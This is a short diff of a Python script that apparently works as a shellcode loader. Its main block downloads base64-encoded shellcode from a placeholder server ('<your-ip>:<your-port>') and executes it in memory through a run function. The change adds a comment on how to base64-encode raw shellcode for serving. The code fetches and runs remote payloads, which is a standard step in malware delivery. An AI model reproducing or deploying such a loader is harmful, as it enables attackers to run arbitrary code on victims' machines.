@@ -43,7 +43,10 @@ def run(sellcode):
     shell_func()
 
 if __name__ == '__main__':
-    # web server with shellcode in base64 format
+    ''' To base64 encode your code, use the following command: 
+        $ base64 -w 0 -i myshellcode.raw > myshellcode.bin '''
+    
+    # web server with shellcode in base64 format. 
     url = "http://<your-ip>:<your-port>/shellcode.bin"
     shellcode = get_code(url)
     run(shellcode)
